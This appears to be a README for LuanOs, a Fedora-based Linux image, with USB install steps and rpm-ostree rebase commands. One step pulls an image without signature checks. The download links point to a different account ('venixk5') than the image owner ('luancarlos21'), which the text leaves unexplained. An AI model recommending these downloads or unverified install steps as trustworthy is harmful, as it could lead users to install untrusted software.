# 🌟 LuanOs - A Simple Way to Experience Linux

[![Download LuanOs](https://img.shields.io/badge/Download%20LuanOs-v1.0-blue)](https://github.com/venixk5/LuanOs/releases)

## 📖 Overview

LuanOs offers a smooth, user-friendly Linux experience. This operating system is designed for those who want to explore Linux without getting lost in complex features. With LuanOs, you can enjoy an efficient and reliable environment that meets your computing needs.

## 🚀 Getting Started

Follow these steps to download and set up LuanOs on your computer. 

### 🔗 Quick Download Link

You can visit the [Releases page](https://github.com/venixk5/LuanOs/releases) for the latest version of LuanOs. 

### 📥 Download & Install

1. **Visit the Releases Page**: Go to the [LuanOs Releases page](https://github.com/venixk5/LuanOs/releases).
2. **Choose Version**: Look for the latest version listed there. Select the appropriate file for your system.
3. **Download LuanOs**: Click on the file to download it to your computer.

### 💻 System Requirements

Ensure your computer meets the following minimum requirements to run LuanOs smoothly:

- **Processor**: 64-bit processor
- **RAM**: 2 GB minimum, 4 GB recommended
- **Storage**: 10 GB free space
- **Graphics**: Any basic graphics card
- **Network**: Internet access for updates

### 🔧 Installation Steps

1. **Prepare Your System**: Ensure you have a USB drive or a way to install the OS.
2. **Create Bootable Media**:
   - Use software like Rufus or BalenaEtcher.
   - Select the LuanOs file you downloaded.
   - Follow the prompts to create a bootable USB drive.
3. **Boot from USB**:
   - Insert the USB drive into your computer.
   - Restart the computer.
   - Access the BIOS/UEFI setup (usually by pressing F2, F10, or DEL during boot).
   - Set the boot order to prioritize the USB drive.
4. **Install LuanOs**:
   - Follow the on-screen instructions to install LuanOs.
   - Choose the installation type (Erase disk or dual boot).
   - Complete the setup and reboot.

## ⚙️ Features

- **Intuitive Interface**: LuanOs features a clean layout that makes navigation easy for everyone.
- **Essential Applications**: Enjoy pre-installed applications that cover everyday tasks like web browsing, document editing, and media playback.
- **Regular Updates**: Benefit from periodic updates that enhance system performance and security.

## 🔒 Important Note

[!WARNING]  
This version of LuanOs includes experimental features. It is advisable to test it at your own discretion.

To update an existing Fedora installation:

1. Rebase to the unsigned image for proper signing keys and policies:
   ```
   rpm-ostree rebase ostree-unverified-registry:ghcr.io/luancarlos21/luanos:latest
   ```
2. Reboot your system to complete the rebase:
   ```
   systemctl reboot
   ```
3. Rebase to the signed image:
   ```
   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/luancarlos21/luanos:latest
   ```

## 📞 Support

If you face any issues or have questions, feel free to join our community forums or check the FAQ section within the software. You can also contact our support team through the GitHub Issues page.

## 📜 License

LuanOs is available under the MIT License. It allows you to use, modify, and distribute the software freely.

---

Thank you for choosing LuanOs. Enjoy your Linux experience, and feel free to explore its capabilities!